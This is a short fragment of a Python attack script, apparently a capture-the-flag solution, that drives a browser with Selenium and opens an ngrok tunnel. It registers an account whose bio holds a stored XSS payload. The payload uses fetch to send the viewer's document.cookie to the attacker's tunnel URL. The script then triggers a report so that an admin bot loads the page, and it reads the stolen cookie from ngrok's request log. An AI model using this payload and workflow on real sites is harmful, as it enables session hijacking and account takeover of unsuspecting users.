...
driver.get("http://127.0.0.1:4044")
r=requests.get("http://localhost:4044/api/tunnels")
#get public url
...
payload=f"""<script>fetch("{NGROKURL}/flag?cookie="+document.cookie)</script>"""

r=s.post(url+"/signup",data={
    "password":"admin",
    "email":"admin@gmail.com",
    "fullname":"admin",
    "lab":"Laboratory for Computation Security",
    "title":"Bachelor Student","bio":payload},headers={"Content-Type":"application/x-www-form-urlencoded"})
...
driver.find_element_by_id("report_button").click()
sleep(1)
driver.switch_to.window(driver.window_handles[0])

#http://localhost:4044/api/requests/http
r=requests.get("http://localhost:4044/api/requests/http",headers = {'Content-Type': 'application/json ;charset=utf-8'})
